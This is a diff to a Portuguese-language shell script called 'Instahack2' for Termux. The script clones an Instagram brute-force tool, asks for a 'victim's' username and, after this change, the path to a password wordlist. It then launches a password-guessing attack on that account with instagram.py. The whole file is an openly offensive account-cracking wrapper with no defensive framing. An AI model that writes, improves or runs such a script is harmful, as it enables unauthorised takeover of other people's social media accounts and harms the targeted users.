@@ -6,7 +6,6 @@ find Brute-Force; find Instagram
         echo "Pastas foram encontradas"
 else
         echo "ERRO: Pastas nao foram encontradas"
-git clone https://github.com/MRX8001/Brute-Force
 git clone https://github.com/Pure-L0G1C/Instagram
 fi
 #
@@ -33,12 +32,16 @@ figlet Instahack2
 echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
 #
 read -p "[+]=>" vitima
+echo
+echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O CAMINHO DA SUA LISTA DE SENHA"
+#
+read -p "[+]=>" wordlist
 #
 #Iniciando o ataque
 clear
 figlet START
 pip3 install -r requirements.txt
 pip2 install -r requirements.txt
-python3 instagram.py $vitima /data/data/com.termux/files/home/instahackv2/Brute-Force/wordlist/wordlist.txt -m 3
+python3 instagram.py $vitima $wordlist -m 3
 fi
 exit
